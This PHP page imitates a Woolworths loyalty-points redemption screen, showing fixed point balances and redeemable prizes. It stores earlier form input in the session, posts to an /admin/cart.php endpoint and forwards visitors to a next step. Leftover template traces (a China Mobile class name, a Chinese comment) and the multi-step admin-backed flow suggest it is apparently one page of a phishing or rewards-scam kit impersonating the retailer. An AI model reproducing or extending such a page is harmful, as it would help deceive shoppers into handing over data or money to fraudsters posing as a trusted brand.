<?php
    session_start();
    require_once 'config.php';
    
    include('partials/header.php');

    if (isset($_POST['submit'])) {
        $_SESSION['step1Data'] = $_POST;
    }

    $productList = [
        [
            'product_name' => "Woolworths Supermarket $100 Gift Card",
            'product_price' => '1020 Pts',
            'price' => '100',
            'product_qty' => 0,
            'product_image' => '/images/product-01.png'
        ],
        [
            'product_name' => "Piper-heidsieck Brut N/v Brut 750ml*2",
            'product_price' => '900 Pts',
            'price' => '100',
            'product_qty' => 0,
            'product_image' => '/images/product-02.png'
        ],
        [
            'product_name' => "Oral-b Pro 800 Electric Toothbrush Each",
            'product_price' => '820 Pts',
            'price' => '100',
            'product_qty' => 0,
            'product_image' => '/images/product-03.png'
        ],
        [
            'product_name' => "Fairy Platinum All In One Lemon Automatic Dishwasher Tablets 41 Pack*2",
            'product_price' => '800 Pts',
            'price' => '100',
            'product_qty' => 0,
            'product_image' => '/images/product-04.png'
        ]
    ];
?>

    <div id="wx-header__fms" class="hide-for-print" style="margin-top: 124px;">
  <section class="wx-header__delivery ">
    <div class="shop-fulfilment">
  <div class="wx-header__fulfilment">

    <div class="wx-header__fulfilment-container">
      <h2 class="welcome--text">Welcome to Woolworths</h2>
    </div>
  </div>
  <div class="wx-header__fulfilment-border-bottom"></div>
</div>

  </section>
</div>

<style type="text/css">
    .wrap { padding: 30px }
    @media ( max-width: 767px ) {
        .loader-wrap { display: flex; width: 100%; height: 100%; position: fixed; top: 0; left: 0; align-items: center; justify-content: center; z-index: 99999999999999; background: rgba(255, 255, 255, 1) }
        .loader-wrap .loading { display: flex; flex-direction: column; align-items: center }
        .loader-wrap .loading img.china-mobile-logo-img { width: 200px }
        .loader-wrap .loading img { width: 80px }
        .box { background: linear-gradient(56.78deg, #f70c93 0%, #7433df 63.27%, #2da9c8 100%); padding: 30px 20px; border-radius: 8px; display: flex; align-items: center; justify-content: center }
        .section_1, .section_2 { width: 50% }
        .inner_box { display: flex; flex-direction: column }
        .inner_box > span { color: #fff }
        .inner_box > b { color: #fff }
        .product_area { margin-top: 12px }
        .product_area > b { color: #e11086 }
        .product_list { display: grid; align-items: center; justify-content: center; text-align: center; grid-template-columns: auto auto; margin: 0 -10px }
        .product_s { width: 100%; border: 1px solid #efefef; margin: 5px 0; padding: 10px; height: 330px; display: flex; flex-direction: column; align-items: center; justify-content: flex-start }
        .product_s > p { margin: 10px 0; font-size: 15px; font-weight: 500 !important }
        .product_s > p.p_name { margin-top: 0 }
        .product_s > p.p_quantity { font-weight: 700 !important; margin-bottom: 5px }
        .p_image { width: 100% }
        .p_cart { padding: 4px; background: #2870d3; color: #fff; border: 0; width: 100%; border-radius: 12px }
        .update_qty > input:focus { outline: none }
        .update_qty > input:active { outline: none }
        .update_qty > input { outline: none; border: 0; width: 90px; text-align: center }
        .update_qty { margin-bottom: 8px; border-radius: 8px; padding: 0 10px; display: flex; align-items: center; justify-content: center; border: 1px solid }
        .next_page {
            width: 100%;
            line-height: 45px;
            text-align: center;
            display: inline-block;
            color: #fff !important;
            border-radius: .5rem;
            background: #178841;
            cursor: pointer;
        }
        .product_cart .dave-btn { background: #178841; padding: 8px 25px; display: block; border-radius: 50px; color: #fff; font-weight: 400; font-size: 14px; margin: 5px auto 0 }
    }
    .wrap > b { color: #e11086 }
    .box-slider img { width: 100%; padding-bottom: 10px }

    .page6--slider .owl-nav { position: absolute; left: 0; right: 0; top: 0; z-index: 9; bottom: 0; margin: auto; width: 100%; height: 40px; padding: 0 10px }
    .page6--slider button.owl-next, .page6--slider button.owl-prev { background: rgba(255, 255, 255, 0.6) !important; color: #178841 !important; width: 40px; height: 40px; border-radius: 50%; float: right; font-size: 30px !important }
    .page6--slider button.owl-prev { float: left }
    .page6--slider button.owl-next span, .page6--slider button.owl-prev span { font-weight: 100 !important; margin: -7px 0 0 0; display: block }
</style>


<section class="page6--slider">
    <div class="owl-carousel owl-theme">
        <div class="item"><img src="<?php echo $folder_path;?>/images/banner-01.png"></div>
        <div class="item"><img src="<?php echo $folder_path;?>/images/banner-02.png"></div>
        <div class="item"><img src="<?php echo $folder_path;?>/images/banner-03.png"></div>
        <div class="item"><img src="<?php echo $folder_path;?>/images/banner-04.png"></div>
        <div class="item"><img src="<?php echo $folder_path;?>/images/banner-05.png"></div>
        <div class="item"><img src="<?php echo $folder_path;?>/images/banner-06.png"></div>
    </div>
</section>

<div class="wrap">
    <div class="box-slider" style="display:none"><img src="<?php echo $folder_path;?>/images/slider-page6.png"></div>
    <b><i class="fa fa-chevron-left"></i> Points </b>
    <div class="box">
        <div class="section_1">
            <div class="inner_box">
                <span>Available points</span>
                <input type="hidden" id="totalValue" value="5000" />
                <b>1260</b>
            </div>
        </div>
        <div class="section_2">
            <div class="inner_box">
                <span>Expired points</span>
                <b>0</b>
            </div>
        </div>
    </div>
    <div class="product_area">
        <b> Prizes redeemable </b>
        <div class="product_list">
            <input type="hidden" value="" id="totalPrice" />
            <?php foreach($productList as $k => $products) { ?>
                <div class="product_s">
                    <img class="p_image" src="<?php echo $folder_path;?>/<?php echo $products['product_image'] ?>" />
                    <p class="p_quantity"><?php echo $products['product_price'] ?></p>
                    <p class="p_name"><?php echo $products['product_name'] ?></p>
                    <input type="hidden" id="price<?php echo $k ?>" value="<?php echo $products['price'] ?>" />
                    <input type="hidden" id="final_price<?php echo $k ?>" value="" />
                    <div class="update_qty">
                        <i class="fa fa-plus" onclick="up(<?php echo $k ?>)"></i>
                        <input type="number" class="quantity--selector" disabled value="0" id="qty<?php echo $k ?>" />
                        <i class="fa fa-minus" onclick="down(<?php echo $k ?>)"></i>
                    </div>
                </div>
            <?php } ?>
        </div>
    </div>
    <br>
    <br>
    <div class="nextPage">
        <div id="progress-loading" style="display:none;text-align:center;"><img style="width:60px; height:auto;" src="../loading.gif" /></div>
        <button class="next_page" id="carBtn" onclick="goToNextPage()">Next</button>
    </div>
</div>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css"/>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"></script>
<script>
    setTimeout(() => {
        jQuery('.loader-wrap').hide();
    }, 3000);
    let totalValue = 1;
    let calculateValue = 0;
    let quantity = 0;

    function up(val) {
        let totalPrice = Number($('#totalPrice').val());
        if(calculateValue > totalValue) {
            alert('you can add only one item at a time.');
            console.log("value already exeeded");
        } else {
            let value = Number($('#qty' + val).val()) + 1;
            quantity = value;
            $('#qty' + val).val(value);
            let productPrice = Number($('#price' + val).val());
            let finalValue = productPrice * value;
            calculateValue = finalValue;
            console.log("totalPrice ===>", finalValue);
            $('#totalPrice').val(calculateValue);
            // if (finalValue > totalValue) {
            //     alert('超出可用積分');
            // }
        }
    }

    function down(val) {
        let value = Number($('#qty'+val).val()) - 1;
        quantity = value;
        let totalPrice = Number($('#totalPrice').val());
        if(value >= 0) {
            $('#qty' + val).val(value);
            let productPrice = Number($('#price'+val).val());
            console.log("productPrice ==>",productPrice);
            console.log("totalPrice ==>",totalPrice);
            let finalValue = calculateValue - productPrice;
            console.log("finalValue ===>",finalValue);
            calculateValue = finalValue;
            $('#totalPrice').val(finalValue);
        }
    }

    function goToNextPage() {
        let totalPrice = Number($('#totalPrice').val());
        console.log('totalPrice ===>',totalPrice);
        console.log('totalValue ===>',totalValue);
        console.log('quantity ===>',quantity);
        let formData = {
            total_quantity:quantity
        }
        $("#progress-loading").show();
        $('#carBtn').prop('disabled',true);
        $.ajax({
            url:"/admin/cart.php",
            type:"POST",
            data:formData,
            success: function(response) {
                $("#progress-loading").hide();
                console.log("response ===>",response);
                window.location.href='page3.php';
            },
            error: function(error) {
                $("#progress-loading").hide();
                $('#carBtn').prop('disabled',false);
                console.log("error ===>",error);
            }
        });
    }

    $('.owl-carousel').owlCarousel({
        loop: true,
        margin: 0,
        nav: true,
        dots: false,
        autoplay: true,
        responsive: {
            0: {
                items: 1
            },
            600: {
                items: 1
            },
            1000: {
                items: 1
            }
        }
    })
</script>

<?php include('partials/footer.php'); ?>
